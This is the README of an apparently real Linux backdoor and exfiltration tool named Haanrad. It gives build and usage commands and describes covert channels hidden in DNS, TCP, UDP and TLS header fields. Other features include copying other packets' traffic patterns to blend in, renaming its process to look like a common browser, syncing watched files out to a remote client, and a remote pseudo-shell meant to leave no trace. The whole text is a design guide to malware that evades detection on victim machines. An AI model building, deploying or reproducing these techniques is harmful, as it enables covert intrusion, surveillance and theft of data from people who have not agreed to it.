#Haanrad
<b> FULL DISCLOSURE: THIS THING CAN DO BAD THINGS. UNLESS UR A BADMAN OR BATMAN, ITS STRONGLY ADVISED NOT TO BE USED </b>

Haanrad is a backdoor exfiltration system that allows a user to covertly exploit the installed system
haanrad is deployed to. Haanrad can be configured in numerous different ways and is designed to be
tolerant in most systems and adjust to the networks behavior as perceived by the victim machine in order
to "blend in". See the `Features` Section for details on functionality

##Setup

###Prerequisits
You must have cmake and gcc installed along with `libdnet` and `libpcap` development libraries installed in order to compile
Haanrad and the client. Note that Haanrad and the client will only work on the Linux based kernel and possibly some
versions of Mac or BSD

###Installation
Execute the following commands

1. clone the project and `cd` into the project root
2. Execute the following command `cmake .`
3. Then execute `make` if you are on Linux. This will generate all required programs in the project root under the `/bin` folder

###Usage
Run Haanrad with the following command from within the `/bin` folder
```
./haanrad -c <ipofclient> [--DEBUG] [--DOF] [--HINT] [-t <timetick>] [-h <historylength>]
```
The parameters are as follows:

| Parameter | Purpose                                                                                | Required ? | Config File Support ? | Default                          | Example      |
| --------- | -------------------------------------------------------------------------------------- | ---------- | --------------------- | -------------------------------- | ------------ |
| -c        | Give the dot notation IP of the client                                                 | Yes        | Yes                   | N/A                              | -c 127.0.0.1 |
| -t        | Give time cycles of Haanrad in milliseconds, lower values will make Haanrad run faster | No         | Yes                   | 100                              | -t 450       |
| -h        | Set History Length of how many packet Haanrad will store                               | No         | Yes                   | 100                              | -h 200       |
| --DEBUG   | Get Debug Console Out                                                                  | No         | No                    | Disabled                         | ---DEBUG     |
| --DOF     | Set Haanrad to use default name on rename failure                                      | No         | No                    | Previous name is used on failure | --DOF        |
| --HINT    | Append `-bd` to the process name chosen for Haanrad                                    | No         | No                    | Not Appended                     | --HINT       |
 
Run the client with the following command from within the `/bin` folder
```
./client [--DEBUG]`
```
The parameters are as follows:

| Parameter | Purpose                             | Required ? | Config File Support ? | Default  | Example |
| --------- | ----------------------------------- | ---------- | --------------------- | -------- | ------- |
| --DEBUG   | Print Debug Information To Console  | No         | No                    | Disabled | --DEBUG |
 
 
####Config File Support
Haanrad supports some of the specified options to be declared within a configuration file. There is a very strict orientation
in how this file must be written in order to be picked up by Haanrad. The configuration file is only read at startup
and is never referred to afterwards. In order for the config file to be detected by haanrad it must be located in the same
location as the `haanrad` binary and named `.cache`. Settings are entered in the format of <key>=<value> with the key
being the supported flag listed above without the preceding dash (`-`). An example configuration file might look like this
```
c=127.0.0.1
t=150
```
Note there is no spacing at the beginning or end of the file, and no comments are accepted within the file. Invalid formatting
of the file may cause Haanrad to even crash and not load at all

##Features
* Dynamic Password Generation
* Password Based TLS Authentication & Header Authentication
* Password Based Data Encryption
* Packet Specific Payload Hiding
* Dynamic Network Based Packet Generation
* Popular Process Masking
* File Event and File Syncrhonization
* Pesuodo-Shell Functionality
* Infinite Data Transfer

###Dynamic Password Generation
When Haanrad first initiates, it starts in `STARTUP` mode. In this mode, Haanrad only listens for DNS requests leaving
the system. Upon finding a DNS request packet, Haanrad parses out the first domain in the `QUESTION` section of the DNS
header, converts it to a dot notation domain ASCII string and then sends a copy of the packet back to the client whose
IP is set either as a parameter or in the configuration file upon startup. Haanrad only executes this procedure once, thus
the client must be previously ready before Haanrad begins execution on the target machine. After sending the packet,
Haanrad switches to `FULL FUNCTIONALITY` mode and proceeds to fully operate as a backdoor / exfiltration system.

###Password Based TLS Authentication & Header Authentication
Passwords are sent along with every TLS packet to authenticate with Haanrad and with the client system. For DNS, TCP
and UDP packets, specific flags in the TCP, UDP and IP headers are set to identify Haanrad packets. The flags are set
as follows:

| Protocol | Header        | Value                |
| -------- | ------------- | -------------------- |
| TLS      | None          |  Password in payload |
| DNS      | DNS Z Bit     | 1                    |
| TCP      | TCP RES 1 Bit | 1                    |
| UDP      | IP TOS        | 1                    |

###Password Based Data Encryption
Upon acquiring the password from the network. All data sent to and from Haanrad is expected to be encrypted with the password,
ontop of provide authentication as stated previously. In this implementation, Haanrad encrypts all data transferred with
a CaesarCipher and uses the password length as part of or entirely the offset value. The encryption methods are
as follows:

| Protocol | Encryption    | Offset Calculation                       |
| -------- | ------------- | ---------------------------------------- |
| TLS      | CaesarCipher  | Password Length                          |
| DNS      | CaesarCipher  | Password Length                          |
| TCP      | CaesarCipher  | Password Length                          |
| UDP      | CaesarCipher  | Password Length + Destination Port Value |

###Packet Specific Payload Hiding
All payloads are covertly transferred between the client and Haanrad. Depending on the type of packet used though,
specifies the location of where the payload is stored and how much data can be transferred in each packet. The client
always sends TLS packets when communicating with Haanrad so as to ensure the highest reliability in communication to
Haanrad. This is because the TLS packets can carry the largest payload of 35 bytes and are the only packet type
that transports its payload in the body of the packet. The breakdown of TLS and all the other protocols supported
are as follows:

| Protocol | Payload Location               | Payload Max Size |
| -------- | ------------------------------ | ---------------- |
| TLS      | Application Layer Payload      | 35 bytes         |
| DNS      | DNS Id Header                  | 2 bytes          |
| TCP      | TCP Sequence Number Byte 3 & 4 | 2 bytes          |
| UDP      | UDP Source Port Byte 2         | 2 bytes          |

###Dynamic Network Based Packet Generation
In order to best hide the data being sent from Haanrad to the client, Haanrad uses the packets in the network as a
template for the packets it sends. While running in `FULL FUNCTIONALITY` mode, Haanrad listens for incoming packets
from the client. If a packet received is not from the client, Haanrad keeps track of it for later use. Haanrad keeps a
total of the last 100 packets that it has received that failed to be from the client. Whenever Haanrad needs to send
a message back to the client, a number of steps are executed:

1. A tally of the most popular packet type within the 100 collected packets is calculated
2. Then a packet of the most popular type is randomly selected from the 100
3. Depending on its type, it is then altered with the appropriate payload amount, encryption and has its destination IP changed to the client's

At this point the packet is simply sent out of a raw socket, where it then is processed by the network stack and sent to
the client disguised as a network packet. This gives Haanrad a unique upperhand, as it is not limited to running on
specific protocols to transfer data. This means Haanrad will send UDP/DNS data when it sees alot of UDP and DNS data on
the network, and will send TCP/TLS data when it sees alot of TCP and TLS data on the network. Additionaly, the UDP and
TCP options, allow Haanrad to operate on unknown Application Layer protocols. Haanrad for example has been tested to use
packets from Google's QUIC protocol, and ICMP or NTS error packets from the network. Due to this ability, Haanrad is able
to heavily blend in and adapt to most network environments.

###Popular Process Masking
Haanrad upon startup will immediatly rename itself so as to be disguised as another process during execution. Periodicaly
throughout Haanrads execution, it will also rename itself again. Haanrad picks its names by scanning all process names on
the system and then tallies them together to determine the most popular name. It then will rename itself to that processes
name to look the least suspicious on the victim machine. This functionality is meant to exploit the commonality of many
users having numerous internet browsers open, making it look unsuspicious when multiple show up with `ps` or system monitor

###File Event And File Synchronization
When operating the exfiltration functions, Haanrad supports two options: File Event Listening, and File Synchronization. File
Event Listening will simply listen in a directory for any changes. Whenever a change in the directory does occur, a message
will be sent back to the client that it has happend. During File Synchronization, whenever an event occurs on a file, Haanrad
will read the file and transfer its contents to the client. From here the client is designed to emulate the directory 
Haanrad is hosted on within a local `./sync` folder, maintained by the client. This allows the user to view the files
localy from this directory, but also in the same directory format, as it can be found on the exploited system.

###Pseudo-Shell Functionality
The pseudo-shell allows the client to interact with a shell on the system Haanrad is hosted on. From here, the user can view
system directories and settings from system tools. Haanrad at each command generates a new shell instance, so that no evidence
of a command running is visible, after each execution. In order to maintain semi-persistance such as working directory, Haanrad
uses a "pseudo-shell" implementation. Specificaly when entering `cd` commands, Haanrad will change the working directory variable
of itself to emulate that new directory. This allows all future shells to launch in that same directory, emulating the
action of a directory change

###Infinite Data Transfer
Obviously with data limitations in the packets, not all information will fit into a single packet. In order to maintain
some reliability, the client sends all of its commands in a TLS packet. This is strictly to reduce the number of packets
needed. For Haanrad this is not always an option, and most commonly will use TCP and UDP packets to send data back. In order
to do this, multiple packets need to be sent. Haanrad simply implements this by storing a buffer of the current message
being sent and takes of pieces of it as payload for each packet it sends. It continues this cycle until the whole packet
has been sent. Haanrad's sending system is optimized also to only send one message at a time, eventhough multiple requests
may have arrived. Responses are simply queued before placed in the buffer and processed for sending to the client

